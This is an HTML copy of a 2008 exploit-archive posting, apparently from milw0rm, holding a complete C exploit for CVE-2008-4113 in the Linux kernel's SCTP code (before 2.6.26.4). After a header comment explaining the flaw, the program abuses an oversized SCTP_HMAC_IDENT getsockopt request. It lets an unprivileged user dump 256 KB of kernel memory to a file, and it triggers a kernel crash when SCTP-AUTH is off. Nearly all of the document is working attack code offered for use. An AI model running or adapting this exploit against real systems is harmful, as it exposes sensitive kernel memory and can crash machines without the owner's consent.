<html><head><title>Linux Kernel < 2.6.26.4 SCTP Kernel Memory Disclosure Exploit</title></head><pre>/*
 * cve-2008-4113.c
 *
 * Linux Kernel &lt; 2.6.26.4 SCTP kernel memory disclosure
 * Jon Oberheide &lt;jon@oberheide.org&gt;
 * http://jon.oberheide.org
 * 
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4113
 *
 *   The sctp_getsockopt_hmac_ident function in net/sctp/socket.c in the Stream
 *   Control Transmission Protocol (sctp) implementation in the Linux kernel 
 *   before 2.6.26.4, when the SCTP-AUTH extension is enabled, relies on an 
 *   untrusted length value to limit copying of data from kernel memory, which 
 *   allows local users to obtain sensitive information via a crafted 
 *   SCTP_HMAC_IDENT IOCTL request involving the sctp_getsockopt function.
 *
 * Notes:
 *
 *   If SCTP AUTH is enabled (net.sctp.auth_enable = 1), this exploit allow an 
 *   unprivileged user to dump an arbitrary amount (DUMP_SIZE) of kernel memory
 *   out to a file (DUMP_FILE). If SCTP AUTH is not enabled, the exploit will 
 *   trigger a kernel OOPS.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/sctp.h&gt;

#ifndef SCTP_HMAC_IDENT
#define SCTP_HMAC_IDENT 22
#endif

#define DUMP_SIZE 256*1024
#define DUMP_FILE &quot;mem.dump&quot;

int
main(int argc, char **argv)
{
	int ret, sock;
	FILE *dumpfile;
	char *memdump, *err;
	socklen_t memlen = DUMP_SIZE;

	memdump = malloc(DUMP_SIZE);
	if (!memdump) {
		err = &quot;malloc(3) failed&quot;;
		printf(&quot;[-] Error: %s (%s)\n&quot;, err, strerror(errno));
		return 1;
	}
	memset(memdump, 0, DUMP_SIZE);

	printf(&quot;[+] creating IPPROTO_SCTP socket\n&quot;);

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
	if (sock == -1) {
		err = &quot;socket(2) failed&quot;;
		printf(&quot;[-] Error: %s (%s)\n&quot;, err, strerror(errno));
		return 1;
	}

	printf(&quot;[+] getting socket option SCTP_HMAC_IDENT with length of %d\n&quot;, memlen);

	ret = getsockopt(sock, SOL_SCTP, SCTP_HMAC_IDENT, memdump, &amp;memlen);
	if (ret == -1) {
		err = &quot;getsockopt(2) failed&quot;;
		printf(&quot;[-] Error: %s (%s)\n&quot;, err, strerror(errno));
		return 1;
	}

	printf(&quot;[+] dumping %d bytes of kernel memory to %s\n&quot;, memlen, DUMP_FILE);

	dumpfile = fopen(DUMP_FILE, &quot;wb&quot;);
	if (!dumpfile) {
		err = &quot;fopen(3) failed&quot;;
		printf(&quot;[-] Error: %s (%s)\n&quot;, err, strerror(errno));
		return 1;
	}
	fwrite(memdump, 1, memlen, dumpfile);
	fclose(dumpfile);
	
	printf(&quot;[+] done.\n&quot;);

	return 0;
}

// milw0rm.com [2008-12-29]</pre></html>